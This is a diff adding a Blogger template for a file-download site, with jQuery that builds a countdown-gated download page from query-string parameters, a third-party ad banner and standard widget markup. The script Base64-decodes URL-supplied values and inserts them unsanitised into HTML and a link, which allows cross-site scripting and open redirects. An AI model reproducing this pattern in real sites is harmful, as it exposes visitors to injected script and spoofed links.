+                                        t = s.data("path"),
+                                        d = s.attr("data-key"),
+                                        a = {};
+                                document.location.search.replace(/\??(?:([^=]+)=([^&]*)&?)/g, function() {
+                                        function t(t) {
+                                                return decodeURIComponent(t.split("+")
+                                                        .join(" "))
+                                        }
+                                        a[t(arguments[1])] = t(arguments[2])
+                                });
+                                var l = a.url,
+                                        e = a.title,
+                                        i = a.size,
+                                        n = a.name,
+                                        o = a.date,
+                                        q = a.qulty,
+                                        r = document.location,
+                                        c = (c = Date(Date.now()))
+                                        .toString();
+                                if (0 == t || t || history.replaceState(null, "", "" + window.location.pathname), l) {
+                                        var sherx = ' <ul id="sharebuttons"> <li><a href="https://www.facebook.com/sharer/sharer.php?u=' + r + '" class="fb"><i class="fa fa-facebook" aria-hidden="true"></i></a></li><li><a href="https://twitter.com/share?url=' + r + ' " class="tw"><i class="fa fa-twitter"></i></a></li><li><a href="https://vk.com/share.php?url=' + r + ' "class="vk"><i class="fa fa-vk"></i></a></li> </ul>',
+                                                h = '<div class="container-download">';
+                                        h += "<h2 >Download " + Base64.decode(e) + "</h2>", h += '<div class="table-bordered"><p class="paimall"><span class="prim"><i class="fa fa-fw fa-user" aria-hidden="true"></i>Uploaded by</span><span class="scnd">' + Base64.decode(n) + ' </span></p><p class="paimall hlf right"><span class="prim"><i class="fa fa-fw fa-file-video-o" aria-hidden="true"></i>Quality </span><span class="scnd">' + Base64.decode(q) + ' </span></p><p class="paimall hlf left"><span class="prim"><i class="fa fa-fw fa-hdd-o" aria-hidden="true"></i> Size </span><span class="scnd">' + Base64.decode(i) + '  </span></p><div class="paimall"><span class="prim"><i class="fa fa-fw fa-share-alt" aria-hidden="true"></i> partner </span>' + sherx + "</div></div>", h += '<div class="container-box-ch">', d && (h += '<div class="alert-danger hide"></div>', h += '<div class="captcha-wrap"><div class="g-recaptcha" data-sitekey="' + d + '"/>'), h += '<button id="downloadbtn" class="downloadbtn" style="font-size: 14px;" ><i class="fa fa-cloud-download" aria-hidden="true"></i> Create a download link </button>', h += "</div>", h += "</div>", s.html(h), $(document)
+                                                .on("click", "#downloadbtn", function(t) {
+                                                        if (d) {
+                                                                if (grecaptcha.getResponse()) {
+                                                                        var a = '<div class="skip-ads result"><button id="skipbtn">Please wait<span id="stimer" style="font-weight: bold;">' + s.attr("data-wait") + "</span>Seconds</button></div>";
+                                                                        s.find(".container-box-ch")
+                                                                                .html(a);
+                                                                        var e = $("#stimer")
+                                                                                .text(),
+                                                                                i = setInterval(function() {
+                                                                                        if (0 < --e) {
+                                                                                                var t = e;
+                                                                                                $("#stimer")
+                                                                                                        .text(t)
+                                                                                        } else $(".skip-ads")
+                                                                                                .html('<a  class="download" id="download-files"  target="_blank"   href="' + Base64.decode(l) + '"><i class="fa fa-download"></i>Download now</a>'), clearInterval(i)
+                                                                                }, 1e3)
+                                                                } else s.find(".alert-danger")
+                                                                        .removeClass("hide")
+                                                                        .text("Please click the I'm not a robot box.")
+                                                        } else {
+                                                                a = '<div class="skip-ads result"><button id="skipbtn">Please wait<span id="stimer" style="font-weight: bold;">' + s.attr("data-wait") + "</span>Seconds</button></div>";
+                                                                s.find(".container-box-ch")
+                                                                        .html(a);
+                                                                e = $("#stimer")
+                                                                        .text(), i = setInterval(function() {
+                                                                                if (0 < --e) {
+                                                                                        var t = e;
+                                                                                        $("#stimer")
+                                                                                                .text(t)
+                                                                                } else $(".skip-ads")
+                                                                                        .html('<a  class="download" id="download-files"  target="_blank"   href="' + Base64.decode(l) + '"><i class="fa fa-download"></i>Download now</a>'), clearInterval(i)
+                                                                        }, 1e3)
+                                                        }
+                                                })
+                                } 
+                        })
+        });
+//]]>
+</script>
+</b:if>
+        <div class='row'>
+<b:if cond='data:blog.isMobileRequest == &quot;false&quot;'>
+          <div class='col-12 col-md-3 mb-3'>
+            <b:section class='ads-left sticky-top' cond='!data:view.isPreview' id='ads-left' maxwidgets='1'>
+              <b:widget id='HTML3' locked='false' title='' type='HTML' visible='false'>
+                <b:widget-settings>
+                  <b:widget-setting name='content'><![CDATA[<script type="text/javascript" src="https://uprimp.com/bnr.php?section=General&pub=481715&format=300x50&ga=g&mbtodb=1"></script>
+<noscript><a href="https://yllix.com/publishers/481715" target="_blank"><img src="//ylx-aff.advertica-cdn.com/pub_zn9ugf.png" style="border:none;margin:0;padding:0;vertical-align:baseline;" alt="ylliX - Online Advertising Network" /></a></noscript>]]></b:widget-setting>
+                </b:widget-settings>
+                <b:includable id='main'>
+  <b:include name='widget-title'/>
+  <div class='widget-content'>
+    <data:content/>
+  </div>
+</b:includable>
+              </b:widget>
+            </b:section>
+          </div>
+
+</b:if>
+          <div class='col-12 col-md-6 pb-3'>
+
+
+            <b:if cond='data:blog.pageType == &quot;error_page&quot;'>
+              <div class='text-center' style='font-size: 7vw'>Oops...</div>
+              <div class='text-center' style='font-size: 3vw'>Page not found</div>
+            </b:if>
+
+
+            <b:if cond='data:view.isSingleItem'>        
+
+            </b:if>
+			<div class='isHideLayout'>
+
+            <b:if cond='data:view.isMultipleItems'>
+<section class='layouthide'>
+<div class='row text-center mb-5' style='margin-top:10%'>
+<div class='col-12'>
+<h3>Downloads Files</h3>
+<p>A simple Blogger template for making money by uploading files. It is easy to set up and install.</p>
+</div>
+</div>
+</section>
+              <section class='layouthide'>
+			   
+     <div class='download-files'/>
+       
+			
+
+              </section>
+            </b:if></div>
+
+            <b:section id='page-is' maxwidgets='1' showaddelement='no'>
+              <b:widget cond='data:view.isPost or data:view.isPage or data:view.isPreview' id='Blog1' locked='true' title='Blog Posts' type='Blog' version='1'>
+                <b:widget-settings>
+                  <b:widget-setting name='showDateHeader'>true</b:widget-setting>
+                  <b:widget-setting name='style.textcolor'>#ffffff</b:widget-setting>
+                  <b:widget-setting name='showShareButtons'>false</b:widget-setting>
+                  <b:widget-setting name='authorLabel'>By</b:widget-setting>
+                  <b:widget-setting name='showCommentLink'>false</b:widget-setting>
+                  <b:widget-setting name='style.urlcolor'>#ffffff</b:widget-setting>
+                  <b:widget-setting name='postLocationLabel'>Location</b:widget-setting>
+                  <b:widget-setting name='showAuthor'>true</b:widget-setting>
+                  <b:widget-setting name='style.linkcolor'>#ffffff</b:widget-setting>
+                  <b:widget-setting name='style.unittype'>TextAndImage</b:widget-setting>
+                  <b:widget-setting name='style.bgcolor'>#ffffff</b:widget-setting>
+                  <b:widget-setting name='reactionsLabel'/>
+                  <b:widget-setting name='showAuthorProfile'>false</b:widget-setting>
+                  <b:widget-setting name='style.layout'>1x1</b:widget-setting>
+                  <b:widget-setting name='showLabels'>true</b:widget-setting>
+                  <b:widget-setting name='showLocation'>false</b:widget-setting>
+                  <b:widget-setting name='showTimestamp'>true</b:widget-setting>
+                  <b:widget-setting name='postsPerAd'>1</b:widget-setting>
+                  <b:widget-setting name='showBacklinks'>false</b:widget-setting>
+                  <b:widget-setting name='style.bordercolor'>#ffffff</b:widget-setting>
+                  <b:widget-setting name='showInlineAds'>false</b:widget-setting>
+                  <b:widget-setting name='showReactions'>false</b:widget-setting>
+                </b:widget-settings>
+                <b:includable id='main' var='top'> 
+<b:include data='posts' name='breadcrumb'/>       
+  <b:if cond='data:mobileindex'>
+    <!-- mobile index -->
+    <div class='blog-posts hfeed'>
+      <b:loop values='data:posts' var='post'>
+        <b:if cond='data:post.isFirstPost == &quot;false&quot;'>
+          &lt;/div&gt;
+        </b:if>
+        &lt;div class=&quot;mobile-date-outer date-outer&quot;&gt;
+        <div expr:onclick='data:post.indexOnclick'>
+          <b:include data='post' name='mobile-index-post'/>
+        </div>
+        <b:if cond='data:post.trackLatency'>
+          <data:post.latencyJs/>
+        </b:if>
+      </b:loop>
+      <b:if cond='data:numPosts != 0'>
+        &lt;/div&gt;
+      </b:if>
+    </div>
+  <b:else/>
+
+    <!-- posts -->
+    <div class='blog-posts hfeed'>
+
+      <b:include data='top' name='status-message'/>
+
+      <data:defaultAdStart/>
+      <b:loop values='data:posts' var='post'>
+        <b:if cond='data:post.isDateStart'>
+          <b:if cond='data:post.isFirstPost == &quot;false&quot;'>
+            &lt;/div&gt;&lt;/div&gt;
+          </b:if>
+        </b:if>
+        <b:if cond='data:post.isDateStart'>
+          &lt;div class=&quot;date-outer&quot;&gt;
+        </b:if>
+
+        <b:if cond='data:post.isDateStart'>
+          &lt;div class=&quot;date-posts&quot;&gt;
+        </b:if>
+        <div class='post-outer'>
+        <b:include data='post' name='post'/>
+        <b:include cond='data:blog.pageType in {&quot;static_page&quot;,&quot;item&quot;}' data='post' name='comments'/>
+        </div>
+        <b:if cond='data:post.includeAd'>
+          <b:if cond='data:post.isFirstPost'>
+            <data:defaultAdEnd/>
+          <b:else/>
+            <data:adEnd/>
+          </b:if>
+          <b:if cond='data:mobile == &quot;false&quot;'>
+            <div class='inline-ad'>
+              <data:adCode/>
+            </div>
+          </b:if>
+          <data:adStart/>
+        </b:if>
+        <b:if cond='data:post.trackLatency'>
+          <data:post.latencyJs/>
+        </b:if>
+      </b:loop>
+      <b:if cond='data:numPosts != 0'>
+        &lt;/div&gt;&lt;/div&gt;
+      </b:if>
+      <data:adEnd/>
+    </div>
+  </b:if>
+ <div class='clearfix'/>
+
+  <!-- navigation -->
+  <b:if cond='data:mobile'>
+    <b:include name='mobile-nextprev'/>
+  <b:else/>
+    <b:include name='nextprev'/>
+
+    <!-- feed links -->
+    <b:include name='feedLinks'/>
+  </b:if>
+
+  <b:if cond='data:top.showStars'>
+    <script src='https://www.google.com/jsapi' type='text/javascript'/>
+    <script type='text/javascript'>
+      google.load(&quot;annotations&quot;, &quot;1&quot;, {&quot;locale&quot;: &quot;<data:top.languageCode/>&quot;});
+      function initialize() {
+        google.annotations.setApplicationId(<data:top.blogspotReviews/>);
+        google.annotations.createAll();
+        google.annotations.fetch();
+      }
+      google.setOnLoadCallback(initialize);
+    </script>
+  </b:if>
+  <b:if cond='data:top.showDummy'>
+    <data:top.dummyBootstrap/>
+  </b:if>
+</b:includable>
+                <b:includable id='aboutPostAuthor'>
+  <div class='author-name'>
+    <a class='g-profile' expr:href='data:post.author.profileUrl' rel='author' title='author profile'>
+      <span>
+        <data:post.author.name/>
+      </span>
+    </a>
+  </div>
+  <div>
+    <span class='author-desc'>
+      <data:post.author.aboutMe/>
+    </span>
+  </div>
+</b:includable>
+                <b:includable id='addComments'>
+  <a expr:href='data:post.commentsUrl' expr:onclick='data:post.commentsUrlOnclick'>
+    <b:message name='messages.postAComment'/>
+  </a>
+</b:includable>
+                <b:includable id='backlinkDeleteIcon' var='backlink'>
+  <span expr:class='&quot;item-control &quot; + data:backlink.adminClass'>
+    <a expr:href='data:backlink.deleteUrl' expr:title='data:top.deleteBacklinkMsg'>
+      <img alt='delete icon' expr:title='data:top.deleteBacklinkMsg' height='13' src='https://www.blogger.com/img/icon_delete13.gif' width='13'/>
+    </a>
+  </span>
+</b:includable>
+                <b:includable id='backlinks' var='post'>
+  <a name='links'/><h4><data:post.backlinksLabel/></h4>
+  <b:if cond='data:post.numBacklinks != 0'>
+    <dl class='comments-block' id='comments-block'>
+      <b:loop values='data:post.backlinks' var='backlink'>
+        <div class='collapsed-backlink backlink-control'>
+          <dt class='comment-title'>
+            <span class='backlink-toggle-zippy'>&#160;</span>
+            <a expr:href='data:backlink.url' expr:title='data:backlink.title' rel='nofollow'><data:backlink.title/></a>
+            <b:include data='backlink' name='backlinkDeleteIcon'/>
+          </dt>
+          <dd class='comment-body collapseable'>
+            <data:backlink.snippet/>
+          </dd>
+          <dd class='comment-footer collapseable'>
+            <span class='comment-author'><data:post.authorLabel/> <data:backlink.author/></span>
+            <span class='comment-timestamp'><data:post.timestampLabel/> <data:backlink.timestamp/></span>
+          </dd>
+        </div>
+      </b:loop>
+    </dl>
+  </b:if>
+  <p class='comment-footer'>
+    <a class='comment-link' expr:href='data:post.createLinkUrl' expr:id='data:widget.instanceId + &quot;_backlinks-create-link&quot;' expr:title='data:post.createLinkLabel' rel='nofollow' target='_blank'><data:post.createLinkLabel/></a>
+  </p>
+</b:includable>
+                <b:includable id='blogThisShare'>
+  <b:with value='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=270,width=475\&quot;); return false;&quot;' var='onclick'>
+    <b:include name='platformShare'/>
+  </b:with>
+</b:includable>
+                <b:includable id='breadcrumb' var='posts'>
+<b:if cond='data:blog.homepageUrl != data:blog.url'>
+<b:if cond='data:blog.pageType == &quot;item&quot;'>
+<b:loop values='data:posts' var='post'>
+<b:if cond='data:post.labels'>
+<nav class='breadcrumbs white'>
+<div class='nav-wrapper'>
+<span class='breadcrumb' itemscope='itemscope' itemtype='https://data-vocabulary.org/Breadcrumb'> <a expr:href='data:blog.homepageUrl' itemprop='url' title='Home'><span class='breadcrumb' itemprop='title'>Home</span></a></span> <b:loop values='data:post.labels' var='label'>
+<span class='breadcrumb' itemscope='itemscope' itemtype='https://data-vocabulary.org/Breadcrumb'><a expr:href='data:label.url + &quot;?max-results=6&quot;' expr:title='data:label.name' itemprop='url'><span class='breadcrumb' itemprop='title'> <data:label.name/></span></a><b:if cond='data:label.isLast != &quot;true&quot;'> </b:if></span>
+</b:loop>
+ <span class='breadcrumb'><data:post.title/></span>
+</div>
+  </nav>
+</b:if>
+</b:loop>
+</b:if>
+</b:if>
+</b:includable>
+                <b:includable id='bylineByName' var='byline'>
+  <b:switch var='data:byline.name'>
+  <b:case value='share'/>
+    <b:include cond='data:post.shareUrl' name='postShareButtons'/>
+  <b:case value='comments'/>
+    <b:include cond='data:post.allowComments' name='postCommentsLink'/>
+  <b:case value='location'/>
+    <b:include cond='data:post.location' name='postLocation'/>
+  <b:case value='timestamp'/>
+    <b:include cond='not data:view.isPage' name='postTimestamp'/>
+  <b:case value='author'/>
+    <b:include name='postAuthor'/>
+  <b:case value='labels'/>
+    <b:include cond='data:post.labels' name='postLabels'/>
+  <b:case value='icons'/>
+    <b:include cond='data:post.emailPostUrl' name='emailPostIcon'/>
+  </b:switch>
+</b:includable>
+                <b:includable id='bylineRegion' var='regionItems'>
+  <b:loop values='data:regionItems' var='byline'>
+    <b:include data='byline' name='bylineByName'/>
+  </b:loop>
+</b:includable>
+                <b:includable id='comment-form' var='post'/>
+                <b:includable id='commentAuthorAvatar'>
+  <div class='avatar-image-container'>
+    <img class='author-avatar' expr:src='data:comment.authorAvatarSrc' height='35' width='35'/>
+  </div>
+</b:includable>
+                <b:includable id='commentDeleteIcon' var='comment'/>
+                <b:includable id='commentForm' var='post'>
+  <div class='comment-form'>
+    <a name='comment-form'/>
+    <h4 id='comment-post-message'><data:messages.postAComment/></h4>
+    <b:if cond='data:this.messages.blogComment != &quot;&quot;'>
+      <p><data:this.messages.blogComment/></p>
+    </b:if>
+    <b:include data='post' name='commentFormIframeSrc'/>
+    <iframe allowtransparency='allowtransparency' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight ?: &quot;90px&quot;' frameborder='0' id='comment-editor' name='comment-editor' src='' width='100%'/>
+    <data:post.cmtfpIframe/>
+    <script type='text/javascript'>
+      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;);
+    </script>
+  </div>
+</b:includable>
+                <b:includable id='commentFormIframeSrc' var='post'>
+  <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
+</b:includable>
+                <b:includable id='commentItem' var='comment'>
+  <div class='comment' expr:id='&quot;c&quot; + data:comment.id'>
+    <b:include cond='data:blog.enabledCommentProfileImages' name='commentAuthorAvatar'/>
+
+    <div class='comment-block'>
+      <div class='comment-author'>
+        <b:if cond='data:comment.authorUrl'>
+          <b:message name='messages.authorSaidWithLink'>
+            <b:param expr:value='data:comment.author' name='authorName'/>
+            <b:param expr:value='data:comment.authorUrl' name='authorUrl'/>
+          </b:message>
+        <b:else/>
+          <b:message name='messages.authorSaid'>
+            <b:param expr:value='data:comment.author' name='authorName'/>
+          </b:message>
+        </b:if>
+      </div>
+      <div expr:class='&quot;comment-body&quot; + (data:comment.isDeleted ? &quot; deleted&quot; : &quot;&quot;)'>
+        <data:comment.body/>
+      </div>
+      <div class='comment-footer'>
+        <span class='comment-timestamp'>
+          <a expr:href='data:comment.url' title='comment permalink'>
+            <data:comment.timestamp/>
+          </a>
+          <b:include data='comment' name='commentDeleteIcon'/>
+        </span>
+      </div>
+    </div>
+  </div>
+</b:includable>
+                <b:includable id='commentList' var='comments'>
+  <div id='comments-block'>
+    <b:loop values='data:comments' var='comment'>
+      <b:include data='comment' name='commentItem'/>
+    </b:loop>
+  </div>
+</b:includable>
+                <b:includable id='commentPicker' var='post'>
+  <b:if cond='data:post.showThreadedComments'>
+    <b:include data='post' name='threadedComments'/>
+  <b:else/>
+    <b:include data='post' name='comments'/>
+  </b:if>
+</b:includable>
+                <b:includable id='comment_count_picker' var='post'/>
+                <b:includable id='comment_picker' var='post'/>
+                <b:includable id='comments' var='post'/>
+                <b:includable id='commentsLink'>
+  <a class='comment-link' expr:href='data:post.commentsUrl' expr:onclick='data:post.commentsUrlOnclick'>
+    <b:if cond='data:post.numberOfComments &gt; 0'>
+      <b:message name='messages.numberOfComments'>
+        <b:param expr:value='data:post.numberOfComments' name='numComments'/>
+      </b:message>
+    <b:else/>
+      <data:messages.postAComment/>
+    </b:if>
+  </a>
+</b:includable>
+                <b:includable id='commentsLinkIframe'>
+  <!-- G+ comments, no longer available. The includable is retained for backwards-compatibility. -->
+</b:includable>
+                <b:includable id='commentsTitle'>
+  <h3 class='title'><data:messages.comments/></h3>
+</b:includable>
+                <b:includable id='defaultAdUnit'>
+  <ins class='adsbygoogle' data-ad-format='auto' expr:data-ad-client='data:adClientId ?: data:blog.adsenseClientId' expr:data-ad-host='data:blog.adsenseHostId' expr:data-analytics-uacct='data:blog.analyticsAccountNumber' expr:style='data:style ?: &quot;display: block;&quot;'/>
+  <script>
+   (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+</b:includable>
+                <b:includable id='emailPostIcon'>
+  <span class='byline post-icons'>
+    <!-- email post links -->
+    <span class='item-action'>
+      <a expr:href='data:post.emailPostUrl' expr:title='data:messages.emailPost'>
+        <b:include data='{ iconClass: &quot;touch-icon sharing-icon&quot; }' name='emailIcon'/>
+      </a>
+    </span>
+  </span>
+</b:includable>
+                <b:includable id='facebookShare'>
+  <b:with value='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=430,width=640\&quot;); return false;&quot;' var='onclick'>
+    <b:include name='platformShare'/>
+  </b:with>
+</b:includable>
+                <b:includable id='feedLinks'>
+  <b:if cond='data:blog.pageType != &quot;item&quot;'> <!-- Blog feed links -->
+    <b:if cond='data:feedLinks'>
+      <div class='blog-feeds'>
+        <b:include data='feedLinks' name='feedLinksBody'/>
+      </div>
+    </b:if>
+    <b:else/> <!--Post feed links -->
+    <div class='post-feeds'>
+      <b:loop values='data:posts' var='post'>
+        <b:if cond='data:post.allowComments'>
+          <b:if cond='data:post.feedLinks'>
+            <b:include data='post.feedLinks' name='feedLinksBody'/>
+          </b:if>
+        </b:if>
+      </b:loop>
+    </div>
+  </b:if>
+</b:includable>
+                <b:includable id='feedLinksBody' var='links'>
+</b:includable>
+                <b:includable id='footerBylines'>
+  <b:if cond='data:widgets.Blog.first.footerBylines'>
+    <b:loop index='i' values='data:widgets.Blog.first.footerBylines' var='region'>
+      <b:if cond='not data:region.items.empty'>
+        <div expr:class='&quot;post-footer-line post-footer-line-&quot; + (data:i + 1)'>
+          <b:with value='&quot;footer-&quot; + (data:i + 1)' var='regionName'>
+            <b:include data='region.items' name='bylineRegion'/>
+          </b:with>
+        </div>
+      </b:if>
+    </b:loop>
+  </b:if>
+</b:includable>
+                <b:includable id='googlePlusShare'>
+  <div class='goog-inline-block google-plus-share-container'>
+    <g:plusone annotation='inline' expr:href='data:originalUrl.canonical.http' size='medium' source='blogger:blog:plusone'/>
+  </div>
+</b:includable>
+                <b:includable id='headerByline'>
+  <b:if cond='data:widgets.Blog.first.headerByline'>
+    <div class='post-header'>
+      <div class='post-header-line-1'>
+        <b:with value='&quot;header-1&quot;' var='regionName'>
+          <b:include data='data:widgets.Blog.first.headerByline.items' name='bylineRegion'/>
+        </b:with>
+      </div>
+    </div>
+  </b:if>
+</b:includable>
+                <b:includable id='homePageLink'>
+  <a class='home-link' expr:href='data:blog.homepageUrl'>
+    <data:messages.home/>
+  </a>
+</b:includable>
+                <b:includable id='iframeComments' var='post'>
+  <!-- G+ comments, no longer available. The includable is retained for backwards-compatibility. -->
+</b:includable>
+                <b:includable id='iframe_comments' var='post'/>
+                <b:includable id='inlineAd' var='post'>
+  <b:if cond='!data:view.isPreview'>
+    <b:if cond='data:this.adCode or data:this.adClientId or data:blog.adsenseClientId'>
+      <!-- Ad -->
+      <div class='inline-ad'>
+        <b:if cond='data:this.adCode != &quot;&quot;'>
+          <data:this.adCode/>
+        <b:else/>
+          <b:include cond='data:this.adClientId or data:blog.adsenseClientId' name='defaultAdUnit'/>
+        </b:if>
+      </div>
+    </b:if>
+  <b:else/>
+    <div class='inline-ad'>
+      <div class='inline-ad-placeholder'>
+        <span><b:message name='messages.adsGoHere'/></span>
+      </div>
+    </div>
+  </b:if>
+</b:includable>
+                <b:includable id='linkShare'>
+  <b:with value='&quot;window.prompt(\&quot;Copy to clipboard: Ctrl+C, Enter\&quot;, \&quot;&quot; + data:originalUrl + &quot;\&quot;); return false;&quot;' var='onclick'>
+    <b:include name='platformShare'/>
+  </b:with>
+</b:includable>
+                <b:includable id='mobile-index-post' var='post'>
+  <b:if cond='data:post.dateHeader'>
+    <div class='mobile-index-date'>
+      <div class='date-header'>
+        <span><data:post.dateHeader/></span>
+      </div>
+    </div>
+  </b:if>
+  <div class='mobile-post-outer'>
+    <div class='mobile-index-title-outer'>
+      <h3 class='mobile-index-title entry-title'>
+        <a expr:title='data:post.title' href='javascript:void(0)'><data:post.title/></a>
+      </h3>
+    </div>
+
+    <div>
+      <div class='mobile-index-arrow'>
+        <a href='javascript:void(0)'>&amp;rsaquo;</a>
+      </div>
+      <div class='mobile-post-contents'>
+        <b:if cond='data:post.thumbnailUrl'>
+          <div class='mobile-index-thumbnail'>
+            <div class='Image'>
+              <img expr:src='data:post.thumbnailUrl'/>
+            </div>
+          </div>
+        </b:if>
+
+        <div class='post-body'>
+          <b:if cond='data:post.snippet'><data:post.snippet/></b:if>
+        </div>
+      </div>
+      <div class='clearfix'/>
+    </div>
+    <div class='mobile-index-comment'>
+      <b:if cond='data:blog.pageType != &quot;item&quot;'>
+        <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
+          <b:if cond='data:post.allowComments'>
+            <b:if cond='data:post.numComments != 0'>
+              <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><b:if cond='data:post.numComments == 1'>1 <data:top.commentLabel/><b:else/><data:post.numComments/> <data:top.commentLabelPlural/></b:if></a>
+            </b:if>
+          </b:if>
+        </b:if>
+      </b:if>
+    </div>
+  </div>
+</b:includable>
+                <b:includable id='mobile-main' var='top'>
+    <!-- posts -->
+    <div class='blog-posts hfeed'>
+      <b:include data='top' name='status-message'/>
+      <b:if cond='data:blog.pageType == &quot;index&quot;'>
+        <b:loop values='data:posts' var='post'>
+          <b:include data='post' name='mobile-index-post'/>
+        </b:loop>
+      <b:else/>
+        <b:loop values='data:posts' var='post'>
+          <b:include data='post' name='mobile-post'/>
+        </b:loop>
+      </b:if>
+    </div>
+   <b:include name='mobile-nextprev'/>
+</b:includable>
+                <b:includable id='mobile-nextprev'>
+  <div class='blog-pager' id='blog-pager'>
+    <b:if cond='data:newerPageUrl'>
+      <div class='mobile-link-button' id='blog-pager-newer-link'>
+      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'><data:newerPageTitle/></a>
+      </div>
+    </b:if>
+
+    <b:if cond='data:olderPageUrl'>
+      <div class='mobile-link-button' id='blog-pager-older-link'>
+      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'><data:olderPageTitle/></a>
+      </div>
+    </b:if>
+
+    <div class='mobile-link-button' id='blog-pager-home-link'>
+    <a class='home-link' expr:href='data:blog.homepageUrl' expr:title='data:homeMsg'><data:homeMsg/></a>
+    </div>
+    <div class='mobile-desktop-link'>
+      <a class='home-link' expr:href='data:desktopLinkUrl' expr:title='data:homeMsg'><data:desktopLinkMsg/></a>
+    </div>
+  </div>
+  <div class='clearfix'/>
+</b:includable>
+                <b:includable id='mobile-post' var='post'>
+  <div class='date-outer'>
+    <b:if cond='data:post.dateHeader'>
+      <h2 class='date-header'><span><data:post.dateHeader/></span></h2>
+    </b:if>
+    <div class='date-posts'>
+      <div class='post-outer'>
+        <div class='post hentry uncustomized-post-template'>
+          <a expr:name='data:post.id'/>
+          <b:if cond='data:post.title'>
+            <h3 class='post-title entry-title'>
+              <b:if cond='data:post.link'>
+                <a expr:href='data:post.link' expr:title='data:post.title'><data:post.title/></a>
+              <b:else/>
+                <b:if cond='data:post.url'>
+                  <b:if cond='data:blog.url != data:post.url'>
+                    <a expr:href='data:post.url' expr:title='data:post.title'><data:post.title/></a>
+                  <b:else/>
+                    <data:post.title/>
+                  </b:if>
+                <b:else/>
+                  <data:post.title/>
+                </b:if>
+              </b:if>
+            </h3>
+          </b:if>
+          <div class='post-header'>
+            <div class='post-header-line-1'/>
+          </div>
+        <div class='clearfix'/>
+          <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id'>
+            <data:post.body/>
+	
+            <div class='clearfix'/> <!-- clear for photos floats -->
+          </div>
+        <div class='clearfix'/>
+          <div class='post-footer'>
+            <div class='post-footer-line post-footer-line-1'>
+              <span class='post-author vcard'>
+                <b:if cond='data:top.showAuthor'>
+                  <b:if cond='data:post.authorProfileUrl'>
+                    <span class='fn'>
+                      <a expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
+                        <data:post.author/>
+                      </a>
+                    </span>
+                  <b:else/>
+                    <span class='fn'><data:post.author/></span>
+                  </b:if>
+                </b:if>
+              </span>
+
+              <span class='post-timestamp'>
+                <b:if cond='data:top.showTimestamp'>
+                  <data:top.timestampLabel/>
+                  <b:if cond='data:post.url'>
+                    <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601'><data:post.timestamp/></abbr></a>
+                  </b:if>
+                </b:if>
+              </span>
+
+              <span class='post-comment-link'>
+                <b:if cond='data:blog.pageType != &quot;item&quot;'>
+                  <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
+                    <b:if cond='data:post.allowComments'>
+                      <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick' title='comment'><b:if cond='data:post.numComments == 1'>1 <data:top.commentLabel/><b:else/><data:post.numComments/> <data:top.commentLabelPlural/></b:if></a>
+                    </b:if>
+                  </b:if>
+                </b:if>
+              </span>
+            </div>
+
+            <div class='post-footer-line post-footer-line-2'>
+              <b:if cond='data:top.showMobileShare'>
+                <div class='mobile-link-button goog-inline-block' id='mobile-share-button'>
+                  <a href='javascript:void(0);'><data:shareMsg/></a>
+                </div>
+              </b:if>
+              <b:if cond='data:top.showDummy'>
+                <div class='goog-inline-block dummy-container'><data:post.dummyTag/></div>
+              </b:if>
+            </div>
+          </div>
+        </div>
+
+        <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
+          <b:include data='post' name='comments'/>
+        </b:if>
+        <b:if cond='data:blog.pageType == &quot;item&quot;'>
+          <b:include data='post' name='comments'/>
+        </b:if>
+      </div>
+    </div>
+  </div>
+</b:includable>
+                <b:includable id='nextPageLink'>
+  <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:messages.olderPosts'>
+    <data:messages.olderPosts/>
+  </a>
+</b:includable>
+                <b:includable id='nextprev'/>
+                <b:includable id='otherSharingButton'>
+  <span class='sharing-platform-button sharing-element-other' expr:aria-label='data:messages.shareToOtherApps.escaped' expr:data-url='data:originalUrl' expr:title='data:messages.shareToOtherApps.escaped' role='menuitem' tabindex='-1'>
+    <b:with value='{key: &quot;sharingOther&quot;}' var='platform'>
+      <b:include name='sharingPlatformIcon'/>
+    </b:with>
+    <span class='platform-sharing-text'><data:messages.shareOtherApps.escaped/></span>
+  </span>
+</b:includable>
+                <b:includable id='platformShare'>
+  <a expr:class='&quot;goog-inline-block sharing-&quot; + data:platform.key' expr:data-url='data:originalUrl' expr:href='data:shareUrl + &quot;&amp;target=&quot; + data:platform.target' expr:onclick='data:onclick ? data:onclick : &quot;&quot;' expr:title='data:platform.shareMessage' target='_blank'>
+    <span class='share-button-link-text'>
+      <data:platform.shareMessage/>
+    </span>
+  </a>
+</b:includable>
+                <b:includable id='post' var='post'>
+<b:if cond='data:blog.pageType != &quot;item&quot; and data:blog.pageType != &quot;static_page&quot;'>
+<div class='card' id='classicposter'>
+<article class='post hentry' itemprop='blogPost' itemscope='itemscope' itemtype='https://schema.org/BlogPosting'>
+<div class='card-panel'>
+<b:if cond='data:post.title'>
+<div class='card-title'>
+      <h2 class='post-title entry-title' itemprop='headline'>
+     <b:if cond='data:post.link'>
+       <a expr:href='data:post.link' expr:title='data:post.title'><data:post.title/></a>
+     <b:else/>
+        <b:if cond='data:post.url'>
+          <a expr:href='data:post.url' expr:title='data:post.title'><data:post.title/></a>
+        <b:else/>
+          <data:post.title/>
+        </b:if>
+     </b:if>
+      </h2>
+</div>
+</b:if>
+
+</div>
+<div class='clearfix'/>
+</article>
+</div>
+</b:if>
+
+<b:if cond='data:view.isPage'>
